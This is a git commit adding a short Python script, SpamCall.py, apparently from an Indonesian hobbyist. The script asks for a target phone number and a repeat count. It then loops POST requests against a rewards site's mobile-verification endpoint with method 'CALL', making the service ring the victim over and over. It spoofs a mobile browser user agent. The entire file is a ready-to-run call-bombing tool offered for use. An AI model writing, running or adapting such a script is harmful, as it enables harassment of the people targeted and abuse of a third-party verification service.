39c6a83f7bd4adf685ef1f77d76841c4cdf771ea
Randi-ID <66753543+Rendi-ID@users.noreply.github.com>
2020-06-24 21:11:57 +0700

    Add files via upload

---
+++ SpamCall.py
@@ -0,0 +1,33 @@
+#!/bin/python
+
+import requests
+from requests import post
+import os
+os.system('clear')
+os.system('figlet Spam Call')
+banner = '''
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+Author   : Randiansyah
+Facebook : Rendi Saputra
+Github   : https://github.com/Rendi-ID
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+'''
+
+print(banner)
+no = input("Masukan Nomor Target : ")
+jumlah = int(input("Masukan Jumlah Spam : "))
+url = 'https://id.jagreward.com/member/verify-mobile/'
+
+ua = {
+"Host": "id.jagreward.com",
+"Connection": "keep-alive",
+"User-Agent": "Mozilla/5.0 (Linux; Android 5.1; A1603) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+}
+dat = {
+"method": "CALL",
+"countryCode": "id",
+}
+
+for x in range(jumlah):
+	r = requests.post(url+no, headers=ua, data=dat)
+	print(r.json()["message"])
